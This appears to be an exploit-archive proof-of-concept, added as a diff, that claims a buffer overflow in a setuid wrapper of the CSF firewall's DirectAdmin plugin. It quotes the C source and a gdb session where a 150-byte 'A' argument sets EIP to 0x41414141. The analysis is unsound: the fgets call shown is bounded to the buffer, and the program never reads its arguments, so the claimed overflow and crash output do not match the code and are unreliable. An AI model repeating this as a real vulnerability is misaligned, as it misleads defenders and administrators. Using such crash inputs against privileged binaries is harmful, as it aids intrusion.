@@ -1,0 +1,109 @@
+############################################################################
+# Exploit Title: CSF Firewall Buffer overflow p0c
+# DownLoaD : http://www.configserver.com/free/csf.tgz
+# Date: 2011-12-09
+# Author: FoX HaCkEr
+# site : www.sec4ever.com
+# MaiL : Mkq@hotmail.com
+# Tested on: CentOS3/4
+############################################################################
+
+==============================================================================
+FiLe : CSF.c
+
+/*
+    * Copyright 2006-2011, Way to the Web Limited
+    * URL: http://www.configserver.com
+    * Email: sales@waytotheweb.com
+*/
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+#include <string.h>
+#include <pwd.h>
+main ()
+{
+    FILE *adminFile;
+    uid_t ruid;
+    char name[100];
+    struct passwd *pw;
+    int admin = 0;
+
+    ruid = getuid();
+    pw = getpwuid(ruid);
+
+    adminFile=fopen ("/usr/local/directadmin/data/admin/admin.list","r");
+    while(fgets(name,100,adminFile) != NULL)
+    {
+        int end = strlen(name) - 1;
+        if (end >= 0 && name[end] == '\n') name[end] = '\0';
+        //printf("Name [%s]\n", name);
+        if (strcmp(pw->pw_name, name) == 0) admin = 1;
+    }
+    fclose(adminFile);
+    if (admin == 1)
+    {
+        setuid(0);
+        setgid(0);
+        //setegid(0);
+        //seteuid(0);
+        execv("/usr/local/directadmin/plugins/csf/exec/da_csf.cgi", NULL);
+    } else {
+        printf("Permission denied [User:%s UID:%d]\n", pw->pw_name, ruid);
+    }
+    return 0;
+}
+
+
+=========================================================================== 
+
+why buffer overflow ?
+
+
+Because char name[100];
+
+fgets()
+
+If we add more than what would be happening?
+
+Buffer OverFlow ^_^
+
+============================================================================
+
+
+(gdb) run `python -c 'print "\x41"*150'`
+Starting program: /root/csf `python -c 'print "\x41"*150'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+(gdb) i r
+eax            0x0      0
+ecx            0xb7fc54e0       -1208199968
+edx            0xb7fc6360       -1208196256
+ebx            0xb7fc4ff4       -1208201228
+esp            0xbffff310       0xbffff310
+ebp            0x41414141       0x41414141
+esi            0x0      0
+edi            0x0      0
+eip            0x41414141       0x41414141
+eflags         0x10246  [ PF ZF IF RF ]
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+(gdb) i r eip
+eip            0x41414141       0x41414141
+(gdb) i r eip esp
+eip            0x41414141       0x41414141
+esp            0xbffff310       0xbffff310
+(gdb) 
+=========================================================================
+N0 ExpLoiT ScRipt KiiiD'z
+
+Gr33T'z : ALL My Friends ..............
+
+
+ 		 	   		  
